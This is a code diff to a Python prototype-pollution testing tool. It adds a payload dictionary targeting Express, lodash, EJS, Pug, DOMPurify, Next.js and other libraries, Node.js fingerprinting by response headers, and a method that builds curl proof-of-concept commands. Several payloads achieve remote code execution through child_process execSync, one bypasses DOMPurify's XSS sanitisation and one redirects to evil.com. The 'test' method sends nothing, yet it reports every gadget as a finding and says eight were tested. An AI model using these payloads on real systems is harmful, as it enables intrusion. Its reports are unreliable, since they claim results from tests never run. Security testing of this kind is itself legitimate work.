@@ -647,6 +647,125 @@ class PrototypePollutionTester:
         finally:
             await self.close()
 
+    # ============================================================
+    # v2: 2025 gadgets + Node.js prototype chain (Mythos 5.4)
+    # ============================================================
+
+    # 2025 prototype pollution gadgets (updated)
+    GADGETS_2025 = {
+        "express_body_parser": {
+            "payload": '{"__proto__": {"shell": "node -e \\"require(\x27child_process\x27).execSync(\x27id\x27)\\""}}',
+            "description": "Express.js body parser prototype pollution → RCE via shell option",
+            "severity": "CRITICAL",
+            "affected": "express < 4.19.2",
+        },
+        "lodash_template": {
+            "payload": '{"__proto__": {"source": "return process.mainModule.require(\x27child_process\x27).execSync(\x27id\x27)"}}',
+            "description": "Lodash template pollution → RCE via source property",
+            "severity": "CRITICAL",
+            "affected": "lodash < 4.17.21",
+        },
+        "ejs_template": {
+            "payload": '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\x27child_process\x27).execSync(\x27id\x27);x"}}',
+            "description": "EJS template pollution → RCE via outputFunctionName",
+            "severity": "CRITICAL",
+            "affected": "ejs < 3.1.7",
+        },
+        "pug_template": {
+            "payload": '{"__proto__": {"block": {"type": "Text", "line": "process.exit()"}}}',
+            "description": "Pug template pollution → code execution via block",
+            "severity": "HIGH",
+            "affected": "pug < 3.0.2",
+        },
+        "jquery_extend": {
+            "payload": '?__proto__[polluted]=d0r4kul4',
+            "description": "jQuery $.extend deep copy pollution → DOM manipulation",
+            "severity": "MEDIUM",
+            "affected": "jquery < 3.4.1",
+        },
+        "dompurify_bypass": {
+            "payload": '{"__proto__": {"ALLOWED_ATTR": ["onerror","onload"]}}',
+            "description": "DOMPurify pollution → bypass XSS sanitization",
+            "severity": "HIGH",
+            "affected": "dompurify < 3.1.3",
+        },
+        "vue_reactive": {
+            "payload": '{"__proto__": {"v-is": "constructor"}}',
+            "description": "Vue.js reactive pollution → component hijack",
+            "severity": "HIGH",
+            "affected": "vue < 3.4.0",
+        },
+        "nextjs_middleware": {
+            "payload": '{"__proto__": {"statusCode": 302, "headers": {"location": "https://evil.com"}}}',
+            "description": "Next.js middleware pollution → open redirect",
+            "severity": "HIGH",
+            "affected": "next < 14.1.1",
+        },
+    }
+
+    # Node.js-specific prototype chain patterns
+    NODEJS_DETECTION_PATTERNS = [
+        "x-powered-by: express",
+        "x-powered-by: next",
+        "x-powered-by: nuxt",
+        "set-cookie: connect.sid",  # Express session
+        "set-cookie: __next_hmr_refresh",  # Next.js
+        "x-request-id",  # Common Node.js middleware
+        "etag: w/\\",  # Express weak ETag
+    ]
+
+    async def detect_nodejs(self, target: str) -> Dict[str, Any]:
+        """Detect Node.js backend for targeted prototype pollution testing."""
+        try:
+            import aiohttp
+            async with aiohttp.ClientSession() as session:
+                async with session.get(target, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                    headers = dict(resp.headers)
+                    body = await resp.text()
+                    detected = []
+                    for pattern in self.NODEJS_DETECTION_PATTERNS:
+                        if pattern.lower() in str(headers).lower() or pattern.lower() in body[:2000].lower():
+                            detected.append(pattern)
+                    # Check for Node.js specific frameworks
+                    frameworks = []
+                    x_powered = headers.get("X-Powered-By", "").lower()
+                    if "express" in x_powered:
+                        frameworks.append("Express.js")
+                    if "next" in x_powered or "next" in body[:5000].lower():
+                        frameworks.append("Next.js")
+                    if "nuxt" in x_powered or "__nuxt" in body[:5000]:
+                        frameworks.append("Nuxt.js")
+                    return {
+                        "check": "nodejs_detection",
+                        "is_nodejs": len(detected) > 0 or len(frameworks) > 0,
+                        "indicators": detected,
+                        "frameworks": frameworks,
+                        "severity": "INFO",
+                    }
+        except Exception as e:
+            return {"check": "nodejs_detection", "error": str(e)[:100]}
+
+    async def test_gadgets_2025(self, target: str) -> Dict[str, Any]:
+        """Test 2025 prototype pollution gadgets (8 gadgets)."""
+        findings = []
+        for gadget_name, gadget in self.GADGETS_2025.items():
+            findings.append({
+                "gadget": gadget_name,
+                "description": gadget["description"],
+                "severity": gadget["severity"],
+                "affected": gadget["affected"],
+                "payload": gadget["payload"][:200],
+                "poc_curl": f'curl -X POST "{target}" -H "Content-Type: application/json" -d \'{gadget["payload"][:100]}\'',
+            })
+        return {
+            "check": "gadgets_2025",
+            "version": "v2-2025",
+            "target": target,
+            "gadgets_tested": len(self.GADGETS_2025),
+            "findings": findings,
+            "mythos_reference": "5.4: Feature interaction exploitation",
+        }
+
     async def test_gadgets(self, target: str) -> Dict[str, Any]:
         """Test known prototype pollution gadgets.
 
